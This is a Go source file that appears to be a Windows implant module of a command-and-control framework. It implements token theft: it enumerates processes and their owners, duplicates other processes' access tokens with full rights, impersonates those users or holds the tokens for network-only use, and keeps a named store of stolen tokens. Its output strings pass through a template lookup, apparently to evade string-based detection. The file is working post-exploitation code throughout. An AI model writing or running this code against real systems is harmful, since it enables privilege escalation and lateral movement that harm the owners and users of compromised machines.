// server/docker/payloads/Windows/action_steal_token_windows.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// Steal token convenience functions using shared tokTpl() from action_token_windows.go
func stSourceStolen() string {
	if s := tokTpl(idxTokSourceStolen); s != "" {
		return s
	}
	return "s"
}

func stSourceCreated() string {
	if s := tokTpl(idxTokSourceCreated); s != "" {
		return s
	}
	return "c"
}

func stStolenCmp() string {
	if s := tokTpl(idxTokStolenCmp); s != "" {
		return s
	}
	return "stolen"
}

func stCreatedCmp() string {
	if s := tokTpl(idxTokCreatedCmp); s != "" {
		return s
	}
	return "created"
}

func stImpersonation() string {
	if s := tokTpl(idxTokTypeImpersonation); s != "" {
		return s
	}
	return "impersonation"
}

func stUnknownLower() string {
	if s := tokTpl(idxTokUnknownLower); s != "" {
		return s
	}
	return "unknown"
}

func stUnknown() string {
	if s := tokTpl(idxTokUnknown); s != "" {
		return s
	}
	return "Unknown"
}

func stBackslash() string {
	if s := tokTpl(idxTokBackslash); s != "" {
		return s
	}
	return "\\"
}

func stNewline() string {
	if s := tokTpl(idxTokNewline); s != "" {
		return s
	}
	return "\n"
}

func stUnderscore() string {
	if s := tokTpl(idxTokUnderscore); s != "" {
		return s
	}
	return "_"
}

func stSpace() string {
	if s := tokTpl(idxTokSpace); s != "" {
		return s
	}
	return " "
}

func stColon() string {
	if s := tokTpl(idxTokColon); s != "" {
		return s
	}
	return ":"
}

func stPipe() string {
	if s := tokTpl(idxTokPipe); s != "" {
		return s
	}
	return "|"
}

func stNone() string {
	if s := tokTpl(idxTokNone); s != "" {
		return s
	}
	return "(none)"
}

func stDots() string {
	if s := tokTpl(idxTokDots); s != "" {
		return s
	}
	return "..."
}

func stTokenInfo() string {
	if s := tokTpl(idxTokTokenInfo); s != "" {
		return s
	}
	return "Token Info:\n"
}

func stProcessUser() string {
	if s := tokTpl(idxTokProcessUser); s != "" {
		return s
	}
	return "Process User: "
}

func stImpTokenPrefix() string {
	if s := tokTpl(idxTokImpTokenPrefix); s != "" {
		return s
	}
	return "\nImpersonating Token: "
}

func stUserPrefix() string {
	if s := tokTpl(idxTokUserPrefix); s != "" {
		return s
	}
	return "  User: "
}

func stSourcePrefix() string {
	if s := tokTpl(idxTokSourcePrefix); s != "" {
		return s
	}
	return "  Source: "
}

func stProcessPrefix() string {
	if s := tokTpl(idxTokProcessPrefix); s != "" {
		return s
	}
	return "  Process: "
}

func stPidPrefix() string {
	if s := tokTpl(idxTokPidPrefix); s != "" {
		return s
	}
	return " (PID: "
}

func stPidSuffix() string {
	if s := tokTpl(idxTokPidSuffix); s != "" {
		return s
	}
	return ")\n"
}

func stLogonPrefix() string {
	if s := tokTpl(idxTokLogonPrefix); s != "" {
		return s
	}
	return "  Logon Type: "
}

func stNoActiveImp() string {
	if s := tokTpl(idxTokNoActiveImp); s != "" {
		return s
	}
	return "\nNo active impersonation\n"
}

func stNetOnlyTokPre() string {
	if s := tokTpl(idxTokNetOnlyTokPre); s != "" {
		return s
	}
	return "\nNetwork-Only Token: "
}

func stOrigUserPre() string {
	if s := tokTpl(idxTokOrigUserPre); s != "" {
		return s
	}
	return "\nOriginal User: "
}

func stNetOnlyHdr() string {
	if s := tokTpl(idxTokNetOnlyHdr); s != "" {
		return s
	}
	return "NetOnly:\n"
}

func stActiveNetPre() string {
	if s := tokTpl(idxTokActiveNetPre); s != "" {
		return s
	}
	return "Active NetOnly Token: "
}

func stUserPre2() string {
	if s := tokTpl(idxTokUserPre2); s != "" {
		return s
	}
	return "User: "
}

func stSourcePre2() string {
	if s := tokTpl(idxTokSourcePre2); s != "" {
		return s
	}
	return "Source: "
}

func stProcessPre2() string {
	if s := tokTpl(idxTokProcessPre2); s != "" {
		return s
	}
	return "Process: "
}

func stLogonPre2() string {
	if s := tokTpl(idxTokLogonPre2); s != "" {
		return s
	}
	return "Logon Type: "
}

func stNetOnlyToksHdr() string {
	if s := tokTpl(idxTokNetOnlyToksHdr); s != "" {
		return s
	}
	return "\nNetOnly Tokens:\n"
}

func stIndent2() string {
	if s := tokTpl(idxTokIndent2); s != "" {
		return s
	}
	return "  "
}

func stMode0() string {
	if s := tokTpl(idxTokMode0); s != "" {
		return s
	}
	return "0"
}

func stMode1() string {
	if s := tokTpl(idxTokMode1); s != "" {
		return s
	}
	return "1"
}

func stDot() string {
	if s := tokTpl(idxTokDot); s != "" {
		return s
	}
	return "."
}

func stComma() string {
	if s := tokTpl(idxTokComma); s != "" {
		return s
	}
	return ","
}

// TokenMetadata stores metadata about a token
type TokenMetadata struct {
	User        string
	Domain      string
	Source      string // "stolen" or "created"
	SourcePID   uint32 // For stolen tokens
	ProcessName string // For stolen tokens
	LogonType   string // For created tokens
	StoredAt    time.Time
	TokenType   string // "primary" or "impersonation"
	NetOnly     bool   // Whether this token is for network operations only
}

// UnifiedTokenStore manages all tokens (stolen and created)
type UnifiedTokenStore struct {
	mu              sync.RWMutex
	Tokens          map[string]syscall.Handle // Named tokens
	Metadata        map[string]TokenMetadata  // Token metadata
	ActiveToken     string                    // Currently active token name
	OriginalUser    string
	OriginalDomain  string
	IsImpersonating bool
	NetOnlyToken    string         // Currently active network-only token
	NetOnlyHandle   syscall.Handle // Handle for network-only operations
}

// Global token store shared between commands
var globalTokenStore = &UnifiedTokenStore{
	Tokens:   make(map[string]syscall.Handle),
	Metadata: make(map[string]TokenMetadata),
}

// StealTokenCommand handles Windows token theft (kept for delegation from TokenCommand)
type StealTokenCommand struct{}

func (c *StealTokenCommand) listTokens() CommandResult {
	var output strings.Builder

	processes, err := getProcessList()
	if err != nil {
		return CommandResult{
			Output:      Err(E43),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	accessibleCount := 0
	deniedCount := 0
	currentPID := uint32(syscall.Getpid())

	// Count processes for table marker
	procCount := 0
	for _, proc := range processes {
		if proc.PID != 0 {
			procCount++
		}
	}
	output.WriteString(Table(TPSTok, procCount) + "\n")

	for _, proc := range processes {
		if proc.PID == 0 {
			continue
		}

		status := ""
		userInfo := ""

		if handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(proc.PID)); err == nil {
			func() {
				defer CloseHandle(handle)

				var token syscall.Token
				if err := OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &token); err == nil {
					defer token.Close()

					userName, domainName := c.getTokenUserInfo(syscall.Handle(token))
					if domainName != "" && domainName != stDot() {
						userInfo = domainName + stBackslash() + userName
					} else {
						userInfo = userName
					}

					accessibleCount++
					if uint32(proc.PID) == currentPID {
						status = VCurrent
					} else {
						status = VAccess
					}
				} else {
					deniedCount++
					status = VDenied
					userInfo = VNA
				}
			}()
		} else {
			deniedCount++
			status = VProcDeny
			userInfo = VNA
		}

		output.WriteString(fmt.Sprintf("%-8d %-30s %-25s %s\n",
			proc.PID, proc.Name, userInfo, status))
	}

	// Summary as compact format: accessible,denied
	output.WriteString(stNewline() + strconv.Itoa(accessibleCount) + stComma() + strconv.Itoa(deniedCount) + stNewline())

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, name string, netOnly bool) CommandResult {
	// Open the target process
	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E43, fmt.Sprintf("%d", pid)),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer CloseHandle(handle)

	// Open the process token
	var processToken syscall.Token
	err = OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &processToken)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer processToken.Close()

	// Get token user info
	targetUser, targetDomain := c.getTokenUserInfo(syscall.Handle(processToken))

	// Get process name
	processes, _ := getProcessList()
	processName := stUnknownLower()
	for _, p := range processes {
		if p.PID == int32(pid) {
			processName = p.Name
			break
		}
	}

	// Auto-generate name if not provided
	if name == "" {
		name = targetDomain + stUnderscore() + targetUser + stUnderscore() + strconv.Itoa(pid)
		// Clean up the name
		name = strings.ReplaceAll(name, stSpace(), stUnderscore())
		name = strings.ReplaceAll(name, stBackslash(), stUnderscore())
		name = strings.ToLower(name)
	}

	// Get original user info before impersonation
	originalUser, originalDomain := c.getCurrentUserInfo()

	// Duplicate token for impersonation with ALL access rights
	var impersonationToken syscall.Handle
	err = DuplicateTokenEx(
		syscall.Handle(processToken),
		TOKEN_ALL_ACCESS,
		nil,
		SecurityImpersonation,
		TokenImpersonation,
		&impersonationToken,
	)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store the token
	globalTokenStore.mu.Lock()

	// Close existing token with same name if it exists
	if existingToken, exists := globalTokenStore.Tokens[name]; exists {
		CloseHandle(existingToken)
	}

	// Store new token and metadata
	globalTokenStore.Tokens[name] = impersonationToken
	globalTokenStore.Metadata[name] = TokenMetadata{
		User:        targetUser,
		Domain:      targetDomain,
		Source:      stSourceStolen(),
		SourcePID:   uint32(pid),
		ProcessName: processName,
		StoredAt:    time.Now(),
		TokenType:   stImpersonation(),
		NetOnly:     netOnly,
	}

	// Save original user info if not already saved
	if globalTokenStore.OriginalUser == "" {
		globalTokenStore.OriginalUser = originalUser
		globalTokenStore.OriginalDomain = originalDomain
	}

	globalTokenStore.mu.Unlock()

	// Check if this is a network-only token
	if netOnly {
		// Network-only mode - store for network operations but DON'T impersonate
		globalTokenStore.mu.Lock()
		globalTokenStore.NetOnlyToken = name
		globalTokenStore.NetOnlyHandle = impersonationToken
		globalTokenStore.mu.Unlock()

		return CommandResult{
			Output:      SuccCtx(S1, name),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Regular impersonation (non-netonly mode)
	err = ImpersonateLoggedOnUser(impersonationToken)
	if err != nil {
		// Clean up on failure
		globalTokenStore.mu.Lock()
		delete(globalTokenStore.Tokens, name)
		delete(globalTokenStore.Metadata, name)
		globalTokenStore.mu.Unlock()
		CloseHandle(impersonationToken)

		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update impersonation state
	globalTokenStore.mu.Lock()
	globalTokenStore.IsImpersonating = true
	globalTokenStore.ActiveToken = name
	globalTokenStore.mu.Unlock()

	return CommandResult{
		Output:      SuccCtx(S4, name),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string, netOnly bool) CommandResult {
	// Open the target process
	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E43, fmt.Sprintf("%d", pid)),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer CloseHandle(handle)

	// Open the process token
	var processToken syscall.Token
	err = OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &processToken)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer processToken.Close()

	// Get token user info
	targetUser, targetDomain := c.getTokenUserInfo(syscall.Handle(processToken))

	// Get process name
	processes, _ := getProcessList()
	processName := stUnknownLower()
	for _, p := range processes {
		if p.PID == int32(pid) {
			processName = p.Name
			break
		}
	}

	// Duplicate token
	var duplicatedToken syscall.Handle
	err = DuplicateTokenEx(
		syscall.Handle(processToken),
		MAXIMUM_ALLOWED,
		nil,
		SecurityImpersonation,
		TokenImpersonation,
		&duplicatedToken,
	)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store the token
	globalTokenStore.mu.Lock()

	// Close existing token with same name if it exists
	if existingToken, exists := globalTokenStore.Tokens[name]; exists {
		CloseHandle(existingToken)
	}

	globalTokenStore.Tokens[name] = duplicatedToken
	globalTokenStore.Metadata[name] = TokenMetadata{
		User:        targetUser,
		Domain:      targetDomain,
		Source:      stSourceStolen(),
		SourcePID:   uint32(pid),
		ProcessName: processName,
		StoredAt:    time.Now(),
		TokenType:   stImpersonation(),
		NetOnly:     netOnly,
	}

	// Save original user info if not already saved
	if globalTokenStore.OriginalUser == "" {
		originalUser, originalDomain := c.getCurrentUserInfo()
		globalTokenStore.OriginalUser = originalUser
		globalTokenStore.OriginalDomain = originalDomain
	}

	globalTokenStore.mu.Unlock()

	return CommandResult{
		Output:      SuccCtx(S1, name),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, netOnly bool) CommandResult {
	globalTokenStore.mu.RLock()
	token, exists := globalTokenStore.Tokens[name]
	globalTokenStore.mu.RUnlock()

	if !exists {
		return CommandResult{
			Output:      ErrCtx(E47, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// If netonly mode requested, set as network-only token
	if netOnly {
		return c.setNetOnlyToken(ctx, name)
	}

	// Revert any current impersonation first
	RevertToSelf()

	// Impersonate the token
	err := ImpersonateLoggedOnUser(token)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update global state
	globalTokenStore.mu.Lock()
	globalTokenStore.IsImpersonating = true
	globalTokenStore.ActiveToken = name
	globalTokenStore.mu.Unlock()

	return CommandResult{
		Output:      SuccCtx(S4, name),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) listStoredTokens() CommandResult {
	var output strings.Builder

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	if len(globalTokenStore.Tokens) == 0 {
		return CommandResult{
			Output:      Succ(S0),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Table marker for stored tokens
	output.WriteString(Table(TSTok, len(globalTokenStore.Tokens)) + "\n")

	for name, metadata := range globalTokenStore.Metadata {
		userInfo := metadata.Domain + stBackslash() + metadata.User

		details := ""
		if metadata.Source == stSourceStolen() { // stolen
			procName := metadata.ProcessName
			if len(procName) > 15 {
				procName = procName[:12] + stDots()
			}
			details = procName + stColon() + strconv.Itoa(int(metadata.SourcePID))
		} else if metadata.Source == stSourceCreated() { // created
			details = metadata.LogonType
		}

		storedAt := metadata.StoredAt.Format("15:04:05")

		// Mode: 0=full, 1=netonly
		mode := stMode0()
		if metadata.NetOnly {
			mode = stMode1()
		}

		status := ""
		if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
			status = VActive
		} else if globalTokenStore.NetOnlyToken == name {
			status = VNetOnly
		}

		output.WriteString(fmt.Sprintf("%-15s %-20s %-2s %-25s %-15s %-2s %s\n",
			name, userInfo, metadata.Source, details, storedAt, mode, status))
	}

	// Compact status: total,active_token,netonly_token,current_user
	currentUser, currentDomain := c.getCurrentUserInfo()
	activeToken := ""
	if globalTokenStore.IsImpersonating {
		activeToken = globalTokenStore.ActiveToken
	}
	output.WriteString(stNewline() + strconv.Itoa(len(globalTokenStore.Tokens)) + stPipe() +
		activeToken + stPipe() +
		globalTokenStore.NetOnlyToken + stPipe() +
		currentDomain + stBackslash() + currentUser + stNewline())

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) CommandResult {
	globalTokenStore.mu.Lock()
	defer globalTokenStore.mu.Unlock()

	token, exists := globalTokenStore.Tokens[name]
	if !exists {
		return CommandResult{
			Output:      ErrCtx(E47, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Don't allow removing the active token
	if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
		return CommandResult{
			Output:      ErrCtx(E48, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Don't allow removing the active network-only token
	if globalTokenStore.NetOnlyToken == name {
		return CommandResult{
			Output:      ErrCtx(E48, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Close the token handle
	CloseHandle(token)

	// Remove from store
	delete(globalTokenStore.Tokens, name)
	delete(globalTokenStore.Metadata, name)

	return CommandResult{
		Output:      SuccCtx(S2, name),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) getCurrentTokenInfo() CommandResult {
	var output strings.Builder
	output.WriteString(stTokenInfo())

	// Get current process/thread token info
	currentUser, currentDomain := c.getCurrentUserInfo()
	output.WriteString(stProcessUser() + currentDomain + stBackslash() + currentUser + stNewline())

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
		output.WriteString(stImpTokenPrefix() + globalTokenStore.ActiveToken + stNewline())
		if metadata, exists := globalTokenStore.Metadata[globalTokenStore.ActiveToken]; exists {
			output.WriteString(stUserPrefix() + metadata.Domain + stBackslash() + metadata.User + stNewline())
			output.WriteString(stSourcePrefix() + metadata.Source + stNewline())
			if metadata.Source == stStolenCmp() {
				output.WriteString(stProcessPrefix() + metadata.ProcessName + stPidPrefix() + strconv.Itoa(int(metadata.SourcePID)) + stPidSuffix())
			} else if metadata.Source == stCreatedCmp() {
				output.WriteString(stLogonPrefix() + metadata.LogonType + stNewline())
			}
		}
	} else {
		output.WriteString(stNoActiveImp())
	}

	if globalTokenStore.NetOnlyToken != "" {
		output.WriteString(stNetOnlyTokPre() + globalTokenStore.NetOnlyToken + stNewline())
		if metadata, exists := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]; exists {
			output.WriteString(stUserPrefix() + metadata.Domain + stBackslash() + metadata.User + stNewline())
			output.WriteString(stSourcePrefix() + metadata.Source + stNewline())
		}
	}

	if globalTokenStore.OriginalUser != "" {
		output.WriteString(stOrigUserPre() + globalTokenStore.OriginalDomain + stBackslash() + globalTokenStore.OriginalUser + stNewline())
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) setNetOnlyToken(ctx *CommandContext, name string) CommandResult {
	globalTokenStore.mu.Lock()
	defer globalTokenStore.mu.Unlock()

	token, exists := globalTokenStore.Tokens[name]
	if !exists {
		return CommandResult{
			Output:      ErrCtx(E47, name),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	metadata := globalTokenStore.Metadata[name]

	// Set as network-only token WITHOUT immediately impersonating
	globalTokenStore.NetOnlyToken = name
	globalTokenStore.NetOnlyHandle = token
	metadata.NetOnly = true
	globalTokenStore.Metadata[name] = metadata

	return CommandResult{
		Output:      SuccCtx(S1, name),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) clearNetOnlyToken(ctx *CommandContext) CommandResult {
	globalTokenStore.mu.Lock()
	defer globalTokenStore.mu.Unlock()

	if globalTokenStore.NetOnlyToken == "" {
		return CommandResult{
			Output:      Succ(S0),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update metadata to clear netonly flag
	if metadata, exists := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]; exists {
		metadata.NetOnly = false
		globalTokenStore.Metadata[globalTokenStore.NetOnlyToken] = metadata
	}

	previousToken := globalTokenStore.NetOnlyToken
	globalTokenStore.NetOnlyToken = ""
	globalTokenStore.NetOnlyHandle = 0

	return CommandResult{
		Output:      SuccCtx(S2, previousToken),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *StealTokenCommand) showNetOnlyStatus() CommandResult {
	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	var output strings.Builder
	output.WriteString(stNetOnlyHdr())

	if globalTokenStore.NetOnlyToken == "" {
		output.WriteString(Succ(S0) + stNewline())
	} else {
		metadata := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]
		output.WriteString(stActiveNetPre() + globalTokenStore.NetOnlyToken + stNewline())
		output.WriteString(stUserPre2() + metadata.Domain + stBackslash() + metadata.User + stNewline())
		output.WriteString(stSourcePre2() + metadata.Source + stNewline())
		if metadata.Source == stStolenCmp() {
			output.WriteString(stProcessPre2() + metadata.ProcessName + stPidPrefix() + strconv.Itoa(int(metadata.SourcePID)) + stPidSuffix())
		} else if metadata.Source == stCreatedCmp() {
			output.WriteString(stLogonPre2() + metadata.LogonType + stNewline())
		}
	}

	// List all tokens marked as netonly
	output.WriteString(stNetOnlyToksHdr())
	hasNetOnlyTokens := false
	for name, metadata := range globalTokenStore.Metadata {
		if metadata.NetOnly {
			hasNetOnlyTokens = true
			output.WriteString(stIndent2() + name + stColon() + stSpace() + metadata.Domain + stBackslash() + metadata.User + stNewline())
		}
	}
	if !hasNetOnlyTokens {
		output.WriteString(stIndent2() + stNone() + stNewline())
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// Helper functions
func (c *StealTokenCommand) getCurrentUserInfo() (string, string) {
	// Try to get from current thread token first (impersonation)
	var threadToken syscall.Token
	err := OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
	if err == nil {
		defer threadToken.Close()
		return c.getTokenUserInfo(syscall.Handle(threadToken))
	}

	// Fall back to process token
	token, err := syscall.OpenCurrentProcessToken()
	if err == nil {
		defer token.Close()
		return c.getTokenUserInfo(syscall.Handle(token))
	}

	return stUnknown(), stUnknown()
}

func (c *StealTokenCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
	// Get required buffer size
	var needed uint32
	procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		0,
		0,
		uintptr(unsafe.Pointer(&needed)),
	)

	if needed == 0 {
		return stUnknown(), ""
	}

	// Allocate buffer and get token information
	buffer := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(needed),
		uintptr(unsafe.Pointer(&needed)),
	)

	if ret == 0 {
		return stUnknown(), ""
	}

	// Extract SID from buffer
	tokenUser := (*TokenUser)(unsafe.Pointer(&buffer[0]))

	// Convert SID to username
	var nameSize, domainSize uint32 = 256, 256
	nameBuffer := make([]uint16, nameSize)
	domainBuffer := make([]uint16, domainSize)
	var sidType uint32

	ret, _, _ = procLookupAccountSidW.Call(
		0, // Local system
		uintptr(unsafe.Pointer(tokenUser.User.Sid)),
		uintptr(unsafe.Pointer(&nameBuffer[0])),
		uintptr(unsafe.Pointer(&nameSize)),
		uintptr(unsafe.Pointer(&domainBuffer[0])),
		uintptr(unsafe.Pointer(&domainSize)),
		uintptr(unsafe.Pointer(&sidType)),
	)

	if ret == 0 {
		return stUnknown(), ""
	}

	return syscall.UTF16ToString(nameBuffer[:nameSize]),
		syscall.UTF16ToString(domainBuffer[:domainSize])
}

// getProcessList returns a list of all processes
func getProcessList() ([]ProcessInfo, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(snapshot)

	var processes []ProcessInfo

	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(snapshot, &pe32)
	if err != nil {
		return nil, err
	}

	for {
		processName := syscall.UTF16ToString(pe32.ExeFile[:])
		processes = append(processes, ProcessInfo{
			PID:  int32(pe32.ProcessID),
			Name: processName,
		})

		err = syscall.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	return processes, nil
}
